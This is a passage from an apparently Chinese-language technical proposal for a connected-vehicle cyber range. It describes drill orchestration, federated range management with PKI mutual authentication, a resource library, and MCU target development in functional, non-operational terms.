，包括虚拟机、存储空间、网络带宽等。资源分配功能可以根据演练任务的需求，合理分配资源，确保每个人员都能够获得足够的资源来完成任务。支持对攻防演练任务的编排和管理。管理员可以创建、编辑和删除演练任务，并指定任务的目标、时间、参与人员等。任务编排功能可以根据实际需求，灵活安排演练任务的执行顺序和时间，以满足不同的需求。支持对攻防演练过程的导调和管理。管理员可以监控和调整演练过程中的各个环节，包括演练任务的执行情况、参与人员的表现、靶场资源的利用等。通过过程导调功能，可以及时发现问题并采取相应的措施，确保演练任务的顺利进行。支持对攻防演练任务的导调和管理。管理员可以随时查看任务的执行情况、进度和成果，并根据需要进行调整和指导。任务导调功能可以帮助管理员在演练过程中对任务进行监控和管理，确保任务的有效执行和达到预期的效果。</li><li>支持灵活的网络配置，能够根据实际需求将各个分靶场的目标网络进行连接和扩展。管理员可以通过配置相关参数，包括网络拓扑结构、路由表、VLAN划分等，实现分布式网络的互联。支持管理员设置靶标之间的互通规则，以确保不同分靶场的目标网络和靶标能够正确地交互和通信。管理员可以指定允许的通信协议、端口范围、访问控制策略等，以保证安全性和可控性。</li><li>支持带外采集功能，允许从目标网络中获取节点的状态信息。带外采集是一种通过与节点物理连接的管理接口或协议，获取目标设备的硬件状态、系统配置和运行情况等信息的方法。通过带外采集，模块可以实时监测目标网络中的节点状态，包括CPU利用率、内存使用情况、磁盘空间等，以及节点的运行日志和事件记录等。支持链路采集功能，用于获取目标网络中的网络流量信息。链路采集是指通过监听网络链路上的数据包，分析和提取其中的关键信息，包括源IP地址、目的IP地址、端口号、协议类型等。通过链路采集，模块可以实时获取目标网络中的通信流量情况，包括流量大小、流量方向、通信频率等。这些信息对于分析网络安全风险、检测异常行为和评估网络性能至关重要。提供机器内部操作支持，允许对目标网络中的节点进行远程操作。管理员可以通过模块提供的界面或命令行工具，执行一系列操作命令，包括文件传输、进程管理、配置修改等。这样，管理员可以模拟各种真实的攻击场景，并观察目标网络中节点的响应和行为。节点操作支持有助于评估目标网络的弱点和风险，并指导网络防御策略的制定与优化。</li><li>支持使用先进的数据挖掘技术和算法，识别出关键的特征和模式，发现隐藏在数据背后的安全威胁和异常行为。数据深度挖掘与分析可以帮助管理员更好地理解网络环境，识别潜在风险，并制定相应的安全策略和措施。支持态势分析功能，能够将采集到的数据与已知的安全事件进行关联和比对。通过对多个数据源的综合分析，模块可以构建起整个网络环境的安全态势图，包括网络拓扑结构、节点间的通信模式、安全事件发生的时间和位置等信息。态势分析能够帮助管理员了解网络的整体安全状况，及时发现并响应异常事件，从而提高整车厂网络的威胁识别和应对能力。支持将采集到的数据与已知的安全事件进行关联，通过分析数据之间的关联性，可以更准确地判断是否存在安全威胁。同时，模块还能够进行安全态势计算，即根据采集到的数据，评估网络的安全状态和趋势，并提供相关的安全指标和警报信息。安全事件关联和安全态势计算有助于管理员及时发现潜在的攻击行为，采取相应的防御措施，保障整车厂网络的安全运行。</li></ol><h4 id="技术实现内容-5"><a href="#技术实现内容-5" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>为实现的整车厂网络攻防演练演示模块的要求，提供如下实现方案：</p><p>1. 拓扑编辑与显示模块：</p><p>功能参数如下：提供一个可视化界面，支持办公区、开发测试区、安全运营中心、内网服务器集群、业务服务器集群等区域的拓扑编辑和显示。</p><p>功能参数如下：用户可以通过拖拽和连接的方式创建和配置不同区域的网络拓扑，包括主机设备、网络设备和链路等。</p><p>2. 目标网络管理模块：</p><p>功能参数如下：接收业务层的目标网络配置信息，并利用虚拟化技术生成KVM虚拟节点、Docker容器节点，构建虚拟仿真网络。</p><p>功能参数如下：使用SDN和网络虚拟化技术将实体设备透明接入虚拟网络，实现整个目标网络的管理和控制。</p><p>3. 大数据统一管理模块：</p><p>功能参数如下：存储管理采集到的数据和靶场资源库中的靶标、漏洞、知识图谱等。</p><p>功能参数如下：提供数据查询、检索和分析功能，支持对采集数据和靶场资源的统一管理和利用。</p><p>4. 系统资源监控与管理模块：</p><p>功能参数如下：监控和管理提供系统资源服务的相关服务，包括虚拟计算资源、运维管理资源、实物仿真资源等。</p><p>功能参数如下：提供资源状态监控、资源分配和任务编排等功能，以确保资源的有效利用和任务的顺利执行。</p><p>5. 分布式配置与联通模块：</p><p>功能参数如下：支持与其他分靶场的目标网络和靶标进行互联互通，实现分布式配置和联合攻防演练。</p><p>6. 采集与分析模块：</p><p>功能参数如下：通过带外采集和链路采集获取目标网络中节点的状态信息、机器内部操作、网络流量等。</p><p>功能参数如下：对采集的数据进行深度挖掘和分析，进行态势分析和安全事件关联，为业务层的可视化提供数据支持。</p><p>7. 任务管理与控制模块：</p><p>功能参数如下：管理和控制靶场的人员、靶标、访问控制、状态监控、资源分配、任务编排等。</p><p>功能参数如下：支持攻防演练任务管理和成果管理，对任务、靶标和场景进行分配和控制。</p><p>通过以上模块的设计和集成，可以构建一个功能完备的整车厂网络攻防演练演示平台</p><p>整车厂网络攻防演练演示模主要包含以下功能：</p><p>整车厂网络攻防演练演示模块方便地编辑和显示各个区域的拓扑结构。在拓扑编辑界面，使用图形化工具来绘制和编辑拓扑结构。通过拓扑编辑与显示功能，可以帮助用户更好地理解和管理各个区域的设备和资源。</p><p>整车厂网络攻防演练演示模块可以帮助用户构建和管理大规模的目标网络。提供了灵活的数据管理功能，可以帮助用户有效地管理和组织大量的网络数据。并且支持试验实时指挥功能，可以帮助用户对目标网络进行实时调度和控制。还具备用户行为监控的能力，可以对目标网络中的用户行为进行实时监测和分析。支持态势展示功能，可以将目标网络的实时状态和信息以图形化的方式展示出来。支持联邦靶场的互联互通功能，可以将不同的靶场环境进行联合和协同。</p><p>整车厂网络攻防演练演示模块包括目标网络管理、基础设施、试验支撑、大数据统一管理、分布式适配、试验配置管理、态势分析、数据采集系统。</p><p>整车厂网络攻防演练演示模块包括运维管理资源、虚拟计算资源以及实物仿真资源等硬件资源。</p><p>整车厂网络攻防演练演示模块具备将采集到的数据以及靶场资源库中的靶标、漏洞、知识图谱等进行存储管理等功能。</p><p>整车厂网络攻防演练演示模块通过系统资源服务的监控与管理，实时监控和管理系统中的各类资源，还具备拓扑配置功能，可以对目标网络进行配置描述。</p><p>整车厂网络攻防演练演示模块具备组织和控制攻防演练任务的工具，对相关的人员、设备和资源进行管理，确保演练任务的顺利进行。</p><p>整车厂网络攻防演练演示模块具备靶标互联互通与其他分靶场的目标网络分布式配置功能。</p><p>整车厂网络攻防演练演示模块带外采集是通过与目标网络连接的外部设备或系统来获取信息。链路采集是通过在目标网络上的特定链路上捕获和分析数据包来获取网络流量等信息。</p><p>整车厂网络攻防演练演示模块特征深度挖掘与分析是指对采集到的数据进行细致的分析和挖掘，以识别出潜在的特征或规律。态势分析是指根据采集到的数据，对安全事件进行关联和计算，以形成全面的安全态势。</p><h3 id="联邦靶场攻防演练演示模块"><a href="#联邦靶场攻防演练演示模块" class="headerlink" title="联邦靶场攻防演练演示模块"></a>联邦靶场攻防演练演示模块</h3><h4 id="功能实施方案-6"><a href="#功能实施方案-6" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>支持灵活的试验配置，管理员可以根据实际需求选择合适的攻击与防御策略，并对参与演练的网络节点和系统进行配置。模块应提供简单易用的界面，以便管理员能够对试验进行快速设置和调整。支持目标网络规划功能，即管理员可以指定攻击的目标网络和系统。管理员可以定义网络的拓扑结构、节点之间的连接关系、各个节点的功能和权限等信息。同时，模块还应支持随机生成目标网络的功能，以增加演练的多样性和真实性。具备态势可视化配置功能，通过该功能，管理员可以将演练过程中采集到的数据进行可视化展示，包括网络拓扑图、攻击路径、安全事件发生的时间和位置等信息。管理员可以根据需要自定义可视化的内容和布局，以便更好地理解演练的实时状态和趋势。提供完善的试验控制功能，以便管理员能够对演练过程进行实时监控和管理。管理员可以通过模块界面对攻击和防御行为进行控制，包括启动攻击、调整攻击强度、响应安全事件等。同时，模块还应支持记录和回放试验过程，以便管理员能够对演练结果进行评估和总结。</li><li>支持对分靶场的注册进行管理，管理员可以通过模块的界面或命令行工具，对分靶场进行注册、注销和查询等操作。注册时，会验证分靶场的合法性并分配唯一的标识符，以确保分靶场可以被正确识别和管理。支持对分靶场授权分项资源的功能，管理员可以根据需要，将特定的资源（如网络设备、服务器、数据库等）授权给分靶场使用。授权时，模块会进行权限验证，并将授权信息记录在系统中，以便后续的资源管理和监控。提供分靶场资源管理功能，管理员可以通过模块的界面或命令行工具，对分靶场的资源进行管理，包括资源的添加、删除、修改和查询等操作。模块能够对资源进行分类和标记，以便管理员能够更方便地进行资源管理和监控。支持安全控制和审计功能，以确保对分靶场的注册和资源管理过程的合规性和安全性。管理员可以设置权限策略和审计规则，限制对注册和资源管理的操作权限，并记录操作日志和审计轨迹。这样可以提高对分靶场注册和资源管理过程的可追溯性和安全性。</li><li>支持在主靶场中查看分靶场的靶标资源，管理员可以通过模块的界面或命令行工具，对分靶场的靶标进行查询、导入和导出等操作。模块会对靶标进行分类和标记，以便管理员能够更方便地进行靶标管理和监控。支持在主靶场中查看分靶场的赛题资源，管理员可以通过模块的界面或命令行工具，对分靶场的赛题进行查询、导入和导出等操作。模块会对赛题进行分类和标记，以便管理员能够更方便地进行赛题管理和监控。提供在主靶场中查看分靶场的镜像资源的功能，管理员可以通过模块的界面或命令行工具，对分靶场的镜像进行查询、导入和导出等操作。模块会对镜像进行分类和标记，以便管理员能够更方便地进行镜像管理和监控。支持安全控制和审计功能，以确保对靶标、赛题和镜像资源的查看过程的合规性和安全性。管理员可以设置权限策略和审计规则，限制对资源查看的操作权限，并记录操作日志和审计轨迹。这样可以提高对资源查看过程的可追溯性和安全性。</li><li>支持在主靶场中对分靶场的试验任务进行调度，管理员可以通过模块的界面或命令行工具，对试验任务进行开始、暂停、结束等操作。模块支持对试验任务进行分类和标记，以便管理员能够更方便地进行试验任务管理和监控。支持对试验任务的状态进行查询。管理员可以通过模块的界面或命令行工具，查看试验任务当前的状态，包括正在进行中、已暂停、已结束等状态。模块还支持对试验任务历史状态的查询，以便管理员能够更方便地进行试验任务的分析和评估。支持安全控制和审计功能，以确保对试验任务调度过程的合规性和安全性。管理员可以设置权限策略和审计规则，限制对试验任务调度的操作权限，并记录操作日志和审计轨迹。这样可以提高对试验任务调度过程的可追溯性和安全性。</li><li>支持在试验运行时接收分布式联邦靶场的攻击分析数据。管理员可以通过模块的界面或命令行工具，查看和监控各个分靶场中的攻击数据。模块支持对攻击数据进行分类和标记，以便管理员能够更方便地进行攻击数据的管理和分析。支持将攻击数据关联到对应试验中，并在试验结束后将数据发送到可视化系统进行展示。管理员可以通过模块的界面或命令行工具，对攻击数据进行关联和发送操作。模块支持对攻击数据进行筛选和处理，以便管理员能够更方便地进行攻击数据的分析和呈现。支持安全控制和审计功能，以确保对攻击数据接收和发送过程的合规性和安全性。管理员可以设置权限策略和审计规则，限制对攻击数据接收和发送的操作权限，并记录操作日志和审计轨迹。这样可以提高对攻击数据接收和发送过程的可追溯性和安全性。</li><li>支持在态势可视化界面中查看所有靶场的攻击信息，管理员可以通过模块的界面或命令行工具，实时监控和查看各个靶场中的攻击情况，包括攻击类型、攻击源IP、攻击目标等信息。模块支持对攻击信息进行筛选、排序和标记，以便管理员能够更方便地进行攻击信息的分析和识别。支持将攻击路径可视化展示在联邦靶场的态势可视化界面上。管理员可以通过模块的界面或命令行工具，查看攻击路径的图形化表示，以便更直观地了解攻击者的行为和攻击路径。模块支持对攻击路径进行交互式操作，如缩放、拖动和高亮显示特定节点等，以便管理员能够更深入地分析和理解攻击行为。支持多个靶场之间的协同操作，在态势可视化界面中同时查看所有靶场的攻击信息和攻击路径。管理员可以通过模块的界面或命令行工具，将不同靶场的攻击信息和攻击路径进行关联和比对，以便更全面地了解整个联邦靶场的攻击态势。模块还支持对靶场间的攻击信息和攻击路径进行跨靶场的查询和分析。</li><li>支持在主靶场的界面中查看分靶场分项的基础攻击子图。管理员可以通过界面，查看各个分靶场的基础攻击子图，包括攻击源、攻击目标、攻击路径等信息。模块支持对基础攻击子图进行交互式操作，如放大、缩小、拖动等，以便管理员能够更方便地进行分析和识别。支持在主靶场的界面中查看分靶场分项的复杂攻击子图。复杂攻击子图包含更详细和深入的攻击路径信息，能够展示攻击者在分靶场中的具体行为和攻击策略。管理员可以界面，查看复杂攻击子图，并进行交互式的操作和分析。支持将试验任务注册到有效攻击检测系统，并与基础攻击子图和复杂攻击子图进行关联。管理员可以通过界面，将试验任务的相关信息与攻击子图进行关联，以便更准确地识别和监测试验任务中的攻击行为。模块还支持对关联结果进行查询和展示，方便管理员进行攻击检测和分析。</li><li>支持主靶场和分项靶场之间的通信进行双向身份认证，主靶场和分项靶场在通信时互相验证对方的身份，并确保通信安全可靠。双向身份认证能够有效地防止恶意攻击者冒充合法用户进行攻击。采用PKI证书进行身份认证，主靶场和分项靶场之间的通信需要使用数字证书进行身份验证，确保通信双方的身份可信。数字证书采用公钥加密算法，能够有效地防止信息泄漏和篡改。通过使用双向身份认证和PKI证书认证，联邦靶场攻防演练演示模块能够确保通信安全可靠。管理员可以在使用模块时，放心地进行攻击检测和分析，而无需担心信息泄漏或被篡改的风险。</li></ol><h4 id="技术实现内容-6"><a href="#技术实现内容-6" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>为满足联邦靶场攻防演练演示的要求，提供以下方案：</p><p>1. 联邦靶场全流程支持模块：</p><p>功能参数如下：提供试验配置功能，包括目标网络规划、赛题选择、镜像配置等。</p><p>功能参数如下：支持态势可视化配置，包括攻击信息展示、攻击路径可视化等。</p><p>功能参数如下：提供试验控制功能，包括试验的开始、暂停和结束。</p><p>2. 分靶场注册与资源管理模块：</p><p>功能参数如下：在联邦靶场中管理分靶场的注册信息，包括分靶场的身份认证和授权。</p><p>功能参数如下：支持分靶场授权分项的资源，例如靶标、赛题、镜像等。</p><p>3. 主靶场查看分靶场资源模块：</p><p>功能参数如下：在联邦靶场的主靶场中提供查看分靶场的靶标、赛题、镜像等资源的功能。</p><p>4. 统一试验任务调度模块：</p><p>功能参数如下：在联邦靶场的主靶场中统一进行试验任务的调度，包括试验的开始、暂停和结束。</p><p>功能参数如下：管理试验任务的状态和进度，确保试验任务的顺利执行。</p><p>5. 攻击分析数据接收与可视化展示模块：</p><p>功能参数如下：在试验过程中，支持接收分布式联邦靶场的攻击分析数据。</p><p>功能参数如下：将攻击分析数据关联到对应的试验，并发送到可视化模块进行展示。</p><p>6. 联邦靶场态势可视化模块：</p><p>功能参数如下：在联邦靶场的态势可视化中，展示所有靶场的攻击信息和攻击路径可视化。</p><p>功能参数如下：提供综合的攻击态势分析，帮助用户全面了解联邦靶场的安全状况。</p><p>7. 分项攻击子图与有效攻击检测模块：</p><p>功能参数如下：在联邦靶场的主靶场中，提供查看分靶场分项的基础攻击子图和复杂攻击子图的功能。</p><p>功能参数如下：将试验任务注册到有效攻击检测模块，确保攻击的准确检测和分析。</p><p>8. 双向身份认证模块：</p><p>功能参数如下：在演示场景的主分靶场中，支持双向身份认证功能。</p><p>功能参数如下：基于PKI证书进行身份认证，确保安全的通信和访问控制。</p><p>通过以上模块的设计和集成，可以构建一个满足联邦靶场攻防演练演示要求的系统。</p><p>联邦靶场攻防演练演示模块主要功能如下：</p><p>联邦靶场攻防演练演示模块支持通过联邦靶场进行试验配置，支持通过联邦靶场进行目标网络规划，支持通过联邦靶场进行态势可视化配置，支持通过联邦靶场进行试验控制。</p><p>联邦靶场攻防演练演示模块在联邦靶场中，分靶场是指独立的演练单位，每个分靶场都有自己的资源和权限。在注册分靶场时，指定分靶场所需的资源范围和权限。注册管理还涉及对分靶场进行身份验证和安全审核。</p><p>联邦靶场攻防演练演示模块主靶场可以列出所有已注册的分靶场，并显示各个分靶场所设定的靶标。主靶场可以提供赛题的列表，包括每个分靶场所设定的赛题和相应的难度级别。主靶场可以展示每个分靶场所使用的镜像，包括操作系统、应用软件、漏洞环境等。</p><p>联邦靶场攻防演练演示模块主靶场根据事先设定的计划，开始启动各个分靶场的试验任务。主靶场具备暂停试验任务的权限，可以暂停某个或所有试验任务。主靶场根据试验任务计划或者管理员的指令，统一结束各个分靶场的试验任务。</p><p>联邦靶场攻防演练演示模块主靶场具备接收分布式联邦靶场的攻击分析数据的功能。一旦主靶场接收到分布式联邦靶场的攻击分析数据，根据相应的试验任务进行数据关联。主靶场具备相应的数据存储能力，将接收到的攻击分析数据存储在可靠的数据库中。主靶场使用合适的可视化工具或平台，对关联的攻击分析数据进行展示。</p><p>联邦靶场攻防演练演示模块每个靶场需要能够收集自身的攻击信息，并将其传输到联邦靶场的数据中心或中央服务器。联邦靶场具备强大的数据存储和处理能力，以接收、存储并分析来自各个靶场的攻击信息。联邦靶场的态势可视化系统具备展示各个靶场的攻击信息的功能。联邦靶场的态势可视化系统能够展示攻击路径的可视化。</p><p>联邦靶场攻防演练演示模块每个分靶场收集和保存自身的基础攻击子图数据。在分靶场基础攻击子图的基础上，进一步融合多个分靶场的攻击信息，生成复杂攻击子图。联邦靶场的主靶场实现有效攻击检测算法，并与分靶场的攻击子图进行关联。联邦靶场主靶场的态势可视化系统具备展示分靶场的基础攻击子图和复杂攻击子图的功能。</p><p>联邦靶场攻防演练演示模块建在主分靶场中建立一个PKI基础设施。</p><p>在PKI基础设施中，为每个实体生成公钥和私钥，并使用CA的根证书对公钥进行签名，生成PKI证书。在主分靶场的通信环境中，配置双向身份认证功能。在通信过程中，客户端和服务器通过交换彼此的PKI证书，并通过验证证书的合法性和完整性来进行身份验证。一旦双方成功进行身份认证，可以建立安全通信通道，并使用加密算法对数据进行保护，确保通信的机密性和完整性。</p><h1 id="智能汽车网络靶场资源库"><a href="#智能汽车网络靶场资源库" class="headerlink" title="智能汽车网络靶场资源库"></a>智能汽车网络靶场资源库</h1><h2 id="总体概述"><a href="#总体概述" class="headerlink" title="总体概述"></a>总体概述</h2><p>靶场资源库包含靶场提供靶标、漏洞、威胁情报、测试用例、测试工具等，可以再在实际应用中来满足靶场开展测试验证、安全运营、攻防演练的资源，帮助企业持续降低目标风险，避免由于信息安全性问题而带来的安全风险，降低在运作过程中可能支付的信息安全缺陷损失成本，同时避免安全隐患。</p><h2 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h2><p>资源库包括如下内容：</p><p>靶场资源库包含靶标库、漏洞库、威胁情报库、测试数据库、工具库。</p><p>靶标库：涵盖车端、通信网络、联网业务平台的虚拟及实物仿真靶标</p><p>漏洞库：知识图谱融合漏洞、威胁情报、安全事件和资产等大数据信息，基于机器学习构建攻击画像</p><p>威胁情报库：收集全球不同来源的情报及网络数据，包括IP信誉、域名信誉、文件信誉、APT跟踪、历史活跃信息</p><p>用例库：包含整车、零部件、业务系统测试用例。</p><p>工具库：基于实验室现有测试工具进行升级完善，涵盖云、管、端及数据安全的测试工具，支持将工具统一接入、分类分级管理和自动执行和数据回收。</p><h2 id="系统组成"><a href="#系统组成" class="headerlink" title="系统组成"></a>系统组成</h2><p>智能网联汽车网络靶场资源库系统组成主要提供内容如下表。</p><table><thead><tr><th>序号</th><th>所属系统</th><th>货物分项名称</th><th>数量</th></tr></thead><tbody><tr><td></td><td>资源库</td><td>工具库-软件升级安全测试工具</td><td>1套</td></tr><tr><td></td><td></td><td>工具库-数据安全测试工具</td><td>1套</td></tr><tr><td></td><td></td><td>工具库-系统安全测试工具</td><td>1套</td></tr><tr><td></td><td></td><td>工具库-业务安全测试工具</td><td>1套</td></tr><tr><td></td><td></td><td>工具库-硬件工具</td><td>1套</td></tr><tr><td></td><td></td><td>测试管理平台</td><td>1套</td></tr><tr><td></td><td></td><td>众测活动方案</td><td>1套</td></tr><tr><td></td><td></td><td>靶标库</td><td>1套</td></tr><tr><td></td><td></td><td>漏洞库</td><td>1套</td></tr><tr><td></td><td></td><td>用例库</td><td>1套</td></tr><tr><td></td><td></td><td>威胁情报库</td><td>1套</td></tr><tr><td></td><td>培训</td><td>测试工具使用培训</td><td>30人天</td></tr><tr><td></td><td></td><td>众测活动培训</td><td>10人天</td></tr><tr><td></td><td></td><td>靶标库培训</td><td>20人天</td></tr><tr><td></td><td></td><td>漏洞库培训</td><td>5人天</td></tr><tr><td></td><td></td><td>用例库培训</td><td>20人天</td></tr></tbody></table><h2 id="靶场资源库总体要求"><a href="#靶场资源库总体要求" class="headerlink" title="靶场资源库总体要求"></a>靶场资源库总体要求</h2><h3 id="靶标库"><a href="#靶标库" class="headerlink" title="靶标库"></a>靶标库</h3><p>智能汽车网络靶场靶标库完全涵盖车端、通信网络、联网业务平台的虚拟及实物仿真靶标。靶标库应包含MCU靶标、MPU靶标、E/E架构通信网络靶标、车联网安全场景靶标、ADAS靶标、V2X靶标。</p><h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><p>靶场知识库支持与靶场、汽车安全运营平台对接，实现关联分析能力、场景化分析能力，提高告警处置。测试人员通过靶场和汽车全运营平台可对知识库数据进行查看，并对数据进行维护管理。</p><h3 id="用例库"><a href="#用例库" class="headerlink" title="用例库"></a>用例库</h3><p>基于靶场的信息安全渗透测试的依据即是用例库，包含零部件用例库及整车用例库。内容包含常规检测、硬件检测、固件检测、系统安全检测、应用安全检测、数据安全检测、接口安全检测、通信安全检测、日志安全检测、业务安全检测等。</p><h3 id="工具库"><a href="#工具库" class="headerlink" title="工具库"></a>工具库</h3><p>智能汽车网络靶场工具库包含数据安全测试工具、系统安全测试工具、业务安全测试工具、硬件测试工具等，可覆盖零部件、台架、整车相关的合规、功能及渗透测试，这些测试覆盖车WP29 R155、 WP29 R156、《汽车软件升级通用技术要求》、《汽车整车信息安全技术要求》等。</p><h1 id="智能汽车网络靶场靶标库"><a href="#智能汽车网络靶场靶标库" class="headerlink" title="智能汽车网络靶场靶标库"></a>智能汽车网络靶场靶标库</h1><h2 id="技术路线-1"><a href="#技术路线-1" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="靶标库开发"><a href="#靶标库开发" class="headerlink" title="靶标库开发"></a>靶标库开发</h3><h4 id="MCU靶标开发"><a href="#MCU靶标开发" class="headerlink" title="MCU靶标开发"></a>MCU靶标开发</h4><h5 id="功能实施方案-7"><a href="#功能实施方案-7" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>支持MCU靶标信息的记录，涵盖了每个靶标的基本识别信息，如靶标的名称，而且还包括了靶标的功能场景，以及与之相关的已知威胁和漏洞信息。通过详尽记录使得开发者能够迅速识别和理解每个靶标的特定用途和潜在风险，从而在设计和测试阶段就能够采取及时的安全措施。</li><li>对基础软件层的全面支持，开发的靶标系统能够兼容并有效运行基础软件层，包括操作系统、硬件抽象层、设备驱动和中间件等。</li><li>支持与现有的ECU开发工具进行无缝适配，特别是在仿真的RTE层和应用层。这种支持使得靶标能够模拟真实的ECU行为，允许开发者在仿真环境中验证和测试应用层的代码，同时确保RTE层的正确性和性能。</li><li>支持多种MCU的模拟，包含GW、BCM等，截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bb76702649bad2e4d1070c6a22f11e5e.png"></p><ol><li>支持通过零部件的升级包来制作靶标镜像，开发者能够采用最新的零部件升级包，将其应用于靶标系统，从而创建出一个与实际车辆系统中使用的零部件相匹配的镜像。</li></ol><p><strong>准备工作</strong></p><p>选择MCU：根据需求选择合适的MCU型号。</p><p>获取开发板：购买或制作一个带有所选MCU的开发板。</p><p>开发环境：安装MCU对应的开发环境和编译器。</p><p>硬件工具：准备编程器/调试器、电源、连接线等硬件工具。</p><p>相关文档：下载MCU的数据手册和参考资料。</p><p><strong>设计靶标程序</strong></p><p>需求分析：明确靶标程序需要验证的MCU功能。</p><p>编写代码：使用C语言或汇编语言编写靶标程序。</p><p>初始化MCU的硬件接口。</p><p>编写功能测试代码，如GPIO闪烁LED、串口通信等。</p><p>如果需要，编写中断服务程序和定时器任务。</p><p><strong>编译和调试</strong></p><p>编译代码：在开发环境中编译靶标程序，生成二进制文件。</p><p>下载程序：使用编程器/调试器将编译好的程序烧录到MCU中。</p><p>调试程序：通过调试器进行单步执行，监视寄存器和变量的值，确保程序按预期工作。</p><p><strong>验证和测试</strong></p><p>功能测试：逐一测试MCU的各项功能是否正常。</p><p>性能测试：如果需要，进行性能测试，比如执行速度、功耗测试。</p><p>稳定性测试：长时间运行靶标程序，检查MCU的稳定性。</p><p><strong>文档和报告</strong></p><p>编写文档：记录靶标制作的过程和测试结果。</p><p>问题记录：如果在测试中发现问题，详细记录并分析原因。</p><p>改进建议：提出对靶标程序的改进意见。</p><p>在进行性能和稳定性测试时，注意散热问题，防止MCU过热。</p><ol><li>初始阶段制作的靶标数量为10个，这是为了确保在开发周期的早期就有足够的样本进行测试与评估。</li><li>靶标能够对实物的还原达到无缝的一致性，这包括基础软件层、运行环境、固件以及应用程序四个关键方面。我们的靶标设计和实现过程确保了对这些组件的虚拟化覆盖率能够达到100%。在制作的靶标对固件安全性检测方面具有高度的覆盖性，靶标设计标准能够涵盖85%以上的固件安全检测项，确保能够进行全面而深入的安全性分析，我们的靶标还特别包含了一项关键的固件算法分析检测功能，以便于开发者能够详尽地评估和验证固件中的算法是否具有潜在的安全漏洞。具备对于密钥硬编码的检测能力，这可以确保靶标能够辨识和评估代码中可能存在的硬编码密钥。强化针对服务接口访问的安全性检测功能，这一功能确保我们的测试靶标能够对MCU内部的服务接口进行深入的安全评估，防止任何未经授权的访问尝试，以及对数据完整性的潜在威胁。具备实现对潜在隐藏后门的全面检测能力，这项功能要求我们的靶标具备强大的检测能力，以便能够精准地识别并报告可能存在于MCU内部的任何隐蔽后门。支持敏感数据检测的功能，确保靶标能够有效地识别和标记出任何可能被嵌入到MCU中的敏感信息，如私密凭证、加密密钥或个人用户数据。支持配置文件安全检测功能，确保这些配置文件没有被设置为可能威胁系统安全的状态。支持固件加固安全检测，确保固件在设计和实施过程中的每一个环节都经过了严格的安全审计。靶标能够实现对车内通信安全的全面检测，这包括对车辆内部控制器局域网络（CAN）上车内控制单元的安全策略检测，确保所有通信协议、身份验证过程和数据传输机制都符合最高的安全标准。靶标系统支持与其他ECU通信的安全策略检测，靶标具备高级的检测功能，能够评估和验证MCU与车辆内其他ECU之间通信过程中的安全协议和策略。</li></ol><h5 id="技术实现内容-7"><a href="#技术实现内容-7" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>在MCU靶标开发过程中，应遵循产品定制开发的基本原则，基于MCU的特性进行靶标开发，按照甲方需求，完成相应的靶标开发工作。</p><ol><li>甲方需求分析</li></ol><p>确定MCU靶标的开发目标，在智能网联汽车中MCU的应用范围和作用，继而确定开发的主要内容。根据开发所需的主要内容，确认MCU靶标的功能和性能，采用适合的硬件，可有助于完成相应实验任务。</p><ol><li>硬件设计</li></ol><p>选择适合目标市场和应用领域的MCU芯片。</p><p>设计电路原理图和PCB布局，确保电路稳定性和可靠性。</p><p>考虑外设接口、存储器需求和电源管理等方面的设计。</p><p>把MCU靶标信息的记录，包含靶标名称、靶标功能场景、靶标已知威胁漏洞信息。</p><p>硬件可满足与现有ECU开发工具适配仿真RTE层与应用层。</p><ol><li>固件开发</li></ol><p>在进行固件开发中，设计基础软件层，使用合适的集成开发环境（IDE）和编程语言进行固件开发。要满足与现有ECU开发工具适配仿真RTE层与应用层。</p><p>编写启动代码和驱动程序，确保MCU正常启动和与外设的通信，通过零部件的升级包制作靶标镜像。</p><p>开发应用程序逻辑，实现所需功能和性能要求。</p><p>进行调试和测试，确保固件的正确性和稳定性。</p><p>可满足多种MCU的模拟，包含SRS、DDM、SCU_FL、EPS、RWS、RBS等。</p><p>支持通过零部件的升级包制作靶标镜像。</p><ol><li>软件开发</li></ol><p>开发与MCU靶标交互的上位机软件或移动应用程序。</p><p>设计用户界面，实现与MCU的数据交互和控制功能。</p><p>考虑数据传输和存储的安全性和稳定性。</p><p>MCU靶标对实物的还原包含基础软件层、运行环境、固件、应用程序，对以上内容虚拟化覆盖率可达到100%。</p><p>靶标覆盖85%以上固件安全检测项，包含固件算法分析检测，密钥硬编码检测，服务接口访问安全检测，隐藏后门检测，敏感数据检测，配置文件安全检测，固件加固安全检测。</p><ol><li>集成和测试</li></ol><p>将硬件和固件进行集成，确保它们能够正常工作。我们的MCU靶标对实物的还原至含有基础软件层、运行环境、固件、应用程序，通过制作的靶标，可以对以上内容虚拟化达到100%覆盖率。</p><p>提供的靶标能够100%完全覆盖车内通信安全检测中，而且还不涉及硬件外设的测试项，所包含与CAN上车内控制单元的安全策略检测，与其他ECU通信的安全策略检测等诸多检测项。</p><p>进行功能测试和性能测试，验证MCU靶标的功能和性能是否符合要求。</p><p>修复和优化可能存在的问题，确保产品的质量和稳定性。</p><p>靶标100%覆盖车内通信安全检测中不涉及硬件外设的测试项，包含与CAN上车内控制单元的安全策略检测，与其他ECU通信的安全策略检测。我方还将提供的靶标应覆盖85%以上固件安全检测项，争取尽最大覆盖所有内容，包含固件算法分析检测、密钥硬编码检测、服务接口访问安全、隐藏后门、敏感数据、配置文件安全、固件加固安全等。</p><ol><li>部署和调试</li></ol><p>根据需求进行批量生产，确保产品的一致性和可靠性。</p><p>配置和安装MCU靶标到目标系统中。</p><p>提供相应的技术文档和培训，以便用户正确使用和维护MCU靶标。</p><ol><li>后续支持和维护</li></ol><p>提供技术支持和维护服务，及时解决用户的问题和反馈。</p><p>定期进行固件和软件的更新和升级，以改进功能和修复漏洞。</p><h4 id="★MPU靶标库开发"><a href="#★MPU靶标库开发" class="headerlink" title="★MPU靶标库开发"></a>★MPU靶标库开发</h4><h5 id="功能实施方案-8"><a href="#功能实施方案-8" class="headerlink" 